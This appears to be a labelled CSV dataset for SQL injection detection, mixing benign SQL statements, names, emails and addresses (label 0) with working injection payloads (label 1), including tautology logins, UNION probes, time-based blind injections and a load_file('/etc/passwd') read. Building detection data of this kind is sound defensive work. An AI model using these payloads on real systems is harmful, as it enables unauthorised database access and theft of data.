Query,Label
24710,0
SELECT Count ( * ) AS partly,0
"1"" ) ) ) rlike ( select ( case when ( 7975 = 2446 ) then 1 else 0x28 end ) ) and ( ( ( ""qixm"" like ""qixm",1
SELECT DISTINCT proud FROM did,0
castil de vela,0
"SELECT MAKETIME ( 11, 35, 4 ) ;",0
"1%"" ) union all select null#",1
SELECT LOWER ( CustomerName ) AS LowercaseCustomerName FROM Customers;,0
"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",1
SELECT * FROM consider WHERE NOT recently = 'seen',0
DELETE FROM thought WHERE black = 'declared',0
1' ) ) as tlsl where 8467 = 8467,1
SELECT Count ( * ) AS army,0
input' OR '1'='1'#,1
SELECT COUNT ( doctor ) FROM later,0
decio,0
SELECT * FROM born WHERE broken NOT LIKE '[therefore]%',0
"1"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""phcl"" like ""phcl",1
"SELECT battle,expect,none FROM stranger LEFT JOIN Orders ON substance.roarID = time.special ORDER BY dead.mainly",0
"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'ppwh' = 'ppwh",1
SELECT AVG ( Price ) FROM able,0
"1 ) ) as acni where 6355 = 6355 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"SELECT SUBSTR ( CustomerName, 2, 5 ) AS ExtractString FROM Customers;",0
"INSERT INTO stay ( caught, mainly, find ) VALUES ( 'model', 'mean', 'giving' )",0
"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
trebaol@arroyomolinos-madrid.gq,0
SELECT * FROM running WHERE NOT rocky = 'involved',0
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",1
"1 ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 9333 = 9333",1
1'+ ( select brgo where 9100 = 9100 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1
85009456f,0
SELECT column_name FROM table1 UNION ALL,0
SELECT private ( s ) FROM wing LEFT JOIN,0
1' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1
SELECT cloth FROM worry UNION SELECT certain FROM wooden ORDER BY young,0
en9r195d9,0
SELECT * FROM keep 3,0
"1 ) where 2678 = 2678 union all select null,null,null,null,null,null,null,null,null#",1
igzquiza,0
1' ) where 8274 = 8274,1
"1'|| ( select 'zbdv' where 1618 = 1618 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) ||'",1
if ( 8574 = 7534 ) select 8574 else drop function nxbe--,1
"1'+ ( select niht where 7294 = 7294 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
3.67249E+15,0
SELECT various ( s ) FROM article LEFT JOIN,0
aguinaga achutegui,0
"SELECT column1 , column2, ... FROM table_name WHERE condition ;",0
SELECT AVG ( loud ) FROM chance SELECT SUM ( mice ),0
SELECT * FROM supply FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM ( SELECT bear FROM walk ),0
"1"" and 9468 = 7105--",1
"select * from users where id = 1 union select +!<@,version ( ) -- 1",1
69346006v,0
2.30E+15,0
-8224' ) where 6504 = 6504 or 2461 = 5660,1
benigni@viajesdacapalla.pa,0
SELECT TOP 3 * FROM city,0
dotan,0
1%' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = ',1
"1%"" ) and 7533 = 7533 and ( ""%"" = """,1
SELECT * FROM instant WHERE forgotten LIKE '%third%',0
"admin"" or 1 = 1/*",1
"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1
"select * from generate_series ( 9863,9863,case when ( 9863 = 3285 ) then 1 else 0 end ) limit 1--",1
"1"" ) where 2473 = 2473 and make_set ( 6118 = 7684,7684 ) --",1
SELECT COUNT ( divide ) FROM instrument,0
SELECT * FROM ( SELECT running FROM possibly ),0
"1' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'xhez' like 'xhez",1
torremoroso enrich,0
SELECT * FROM morning FETCH FIRST 3 ROWS ONLY,0
"1"" ) ) as uqem where 3521 = 3521",1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual#",1
"1%' ) ) ) union all select null,null#",1
SELECT * FROM command WHERE north = 'ear',0
"calle marino cervera, 173,",0
"1%"" and 2006 = 2006",1
leda,0
SELECT * FROM mass WHERE ocean = 'syllable' AND City = 'characteristic',0
"1"" ) where 7753 = 7753",1
log9era,0
SELECT AVG ( war ) FROM layers SELECT SUM ( men ),0
crip3gama,0
1%' ) ) rlike sleep ( 5 ) #,1
gilda6@mytanga.om,0
SELECT TOP 3 * FROM hello,0
langellotti,0
SELECT AVG ( mixture ) FROM experience SELECT SUM ( nuts ),0
7.79828E+15,0
8.36404E+15,0
"1' ) as mgko where 1828 = 1828 and make_set ( 8403 = 8403,8899 ) --",1
"SELECT higherID AS ID, wagon AS tree FROM seven",0
"plza. luis cernuda, 88",0
gargajienta,0
5mpe92onal,0
thiel,0
witney,0
"1"" ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
SELECT LOCALTIMESTAMP ( ) ;,0
"tres villas, las",0
SELECT * FROM real,0
"UPDATE frighten SET sort = 'being', City = 'word' WHERE taste = wing",0
"-2359' union all select 2687,2687,2687#",1
"1%"" and 9198 = 9198--",1
SELECT MIN ( happily ) AS exactly FROM blew,0
"1' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 4537 = 4537",1
56163821y,0
gonzaga ripalda,0
46844,0
holtz@pasajesaereosbaratos.es,0
-1641' union all select 4835#,1
